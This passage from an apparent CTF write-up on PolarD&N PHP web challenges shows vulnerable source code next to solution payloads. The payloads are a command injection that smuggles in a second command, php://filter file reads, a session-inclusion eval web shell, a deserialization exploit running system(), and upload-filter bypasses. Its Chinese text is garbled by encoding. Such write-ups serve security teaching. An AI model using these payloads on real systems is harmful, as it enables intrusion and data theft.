keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span><span class="token comment">#62ä½</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$b</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h4><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">1.1.1.1</span></span></code></pre><h4 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">tac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fllllaaag<span class="token operator">.</span>php<span class="token comment">#</span></code></pre><h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET-POST"></a>GET-POST</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ–‡ä»¶åŒ…å«ï¼Œflagåœ¨flag.phpæ–‡ä»¶ä¸­ï¼Œä¸ç”¨æƒ³äº†ä½ è®¿é—®ä¹Ÿæ²¡ç”¨</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ å¿…é¡»è®©æˆ‘æ„Ÿå—åˆ°ä½ çš„çœŸè¯šï¼Œç”¨GETè¯·æ±‚ä¼ é€’ä¸€ä¸‹idå§ï¼Œä»¤id=1"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¹²çš„æ¼‚äº®"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"è™½ç„¶æˆ‘æ„Ÿå—åˆ°äº†ä½ çš„çœŸè¯šï¼Œä½†è¿˜æ˜¯ä¸è¡Œï¼Œç”¨POSTè¯·æ±‚ä¼ é€’ä¸€ä¸‹jljcxyå§ï¼Œä»¤jljcxy=flag"</span><span class="token punctuation">;</span>    <span class="token variable">$jljcxy</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jljcxy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$jljcxy</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ä½ å¿…é¡»è®©æˆ‘æ„Ÿå—åˆ°ä½ çš„çœŸè¯šï¼Œç”¨<span class="token constant">GET</span>è¯·æ±‚ä¼ é€’ä¸€ä¸‹idå§ï¼Œä»¤id<span class="token operator">=</span><span class="token number">1</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span><span class="token punctuation">:</span> jljcxy<span class="token operator">=</span>flag</code></pre><h4 id="è¢«é»‘æ‰çš„ç«™"><a href="#è¢«é»‘æ‰çš„ç«™" class="headerlink" title="è¢«é»‘æ‰çš„ç«™"></a>è¢«é»‘æ‰çš„ç«™</h4><p><img src="hacked_web.png" loading="lazy"></p><p><code>index.php.bak</code>é‡Œéƒ½æ˜¯å¼±å£ä»¤ å»çˆ†ç ´shell.phpçš„å¯†ç å³å¯</p><h4 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h4><p>å‘ç°cookieä¼ äº†<code>didi=no</code>æ”¹ä¸ºyesè¿”å›äº†base64å­—ç¬¦ è§£å¯†å¾—åˆ°è·¯å¾„<code>./data/index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>ç›´æ¥ä¼ªåè®®è¯»å–<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p><h4 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h4><p><img src="qiandao.png" loading="lazy"></p><p>æäº¤æŒ‰é’®æŠŠ<code>disabled</code>åˆ äº† å†æ¬¡æäº¤å¾—åˆ°æç¤º</p><p>æäº¤<code>key=ilovejljcxy</code>å³å¯</p><h4 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a>sessionæ–‡ä»¶åŒ…å«</h4><p>action.phpç›®å½•å¯ä»¥æ–‡ä»¶åŒ…å«</p><p>ä¼ªåè®®è¯»å–æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>&lt;a href=action.php?file=1.txt>my dairy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>&lt;a href=action.php?file=2.txt>my booklist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">GET: ?file=/tmp/sess_iicon09s8aj9rhenj3rn6lhqj2POST: name=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hsad'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="Donâ€™t-touch-me"><a href="#Donâ€™t-touch-me" class="headerlink" title="Donâ€™t touch me"></a>Donâ€™t touch me</h4><p>SignIn</p><h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><p>SignIn</p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Example</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sys</span><span class="token operator">=</span><span class="token string single-quoted-string">'Can you find the leak?'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sys</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Example</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$sys</span><span class="token operator">=</span><span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> </code></pre><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>MIMEé™åˆ¶ gif</p><h4 id="cookieæ¬ºéª—"><a href="#cookieæ¬ºéª—" class="headerlink" title="cookieæ¬ºéª—"></a>cookieæ¬ºéª—</h4><p>SignIn</p><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŒå†™ç»•è¿‡ æºç é‡Œæœ‰è·¯å¾„</p><p><img src="upload_rand.png" loading="lazy"></p><h4 id="å¹²æ­£åˆ™"><a href="#å¹²æ­£åˆ™" class="headerlink" title="å¹²æ­£åˆ™"></a>å¹²æ­£åˆ™</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"www.baidu.com"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token 